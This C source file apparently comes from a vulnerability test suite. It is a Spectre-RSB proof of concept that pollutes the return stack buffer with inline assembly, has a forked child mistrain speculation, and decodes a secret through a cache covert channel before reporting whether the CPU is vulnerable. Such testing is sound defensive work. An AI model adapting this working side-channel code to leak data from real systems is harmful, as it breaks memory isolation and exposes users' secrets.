#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

#define SECRET 'S'

char secret;

// Put to sleep for a long period of time
void __attribute__((noinline)) wrong_return()
{
    usleep(10000);
    return;
}

// Pop the return address from the software stack, causing misspeculation
void __attribute__((noinline)) pollute_rsb()
{
#if defined(__i386__) || defined(__x86_64__)
    asm volatile("pop %%rax\n"
                 :
                 :
                 : "rax");
    asm("jmp return_label");
#elif defined(__aarch64__)
    asm volatile("ldp x29, x30, [sp],#16\n"
                 :
                 :
                 : "x29");
    asm("b return_label");
#endif
}

int main(int argc, char **argv)
{
    PREPARE();

    // OOP attack, so fork
    // pid_t is_child = fork() == 0;
    pid_t pid_child = fork();
    int is_child = (pid_child == 0);
    

    // Attacker always encodes a dot in the cache
    if (is_child)
        secret = '.';
    else
        secret = SECRET;

    // Attacker destroys the software stack return address, causing misspeculation
    if (is_child)
    {
        start_time = time(NULL);
        for (int i = 0; i < 1000; i++)
        {
            // required so that we don't return from our pollute_rsb function, never popping it from the RSB
            asm("return_label:");
            if (time(NULL) - start_time > timeout)
            {
                exit(-1);
            }
            pollute_rsb();
            // no real execution of this maccess, so we normally should never have cache hits
            // Victim is transiently misdirected here
            cache_encode(secret);
            maccess(0);
        }
        exit(1);
    }
    else
    {
        start_time = time(NULL);
        for (int i = 0; i < 1000; i++)
        {
            // Flush shared memory
            flush_shared_memory();
            mfence();
            // Call function and transiently return to wrong location before coming back here
            wrong_return();

            // Recover data from covert channel
            if (cache_decode() == 'S')
            {
                passed_count++;
            }
            if (time(NULL) - start_time > timeout)
            {
                printf(ANSI_COLOR_YELLOW "Spectre_RSB_ca_oop: Timeout" ANSI_COLOR_RESET "\n");
                printf("Spectre_RSB_ca_oop Done!\n\n");
                kill(pid_child, SIGKILL);
                exit(-1);
            }
        }
        int exit_result = 0;
        if (passed_count > 0)
        {
            printf(ANSI_COLOR_RED "Spectre_RSB_ca_oop: Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_SUCCESS;
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_RSB_ca_oop: Not Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_FAILURE;
        }
        kill(pid_child, SIGKILL);
        exit(exit_result);
    }
}
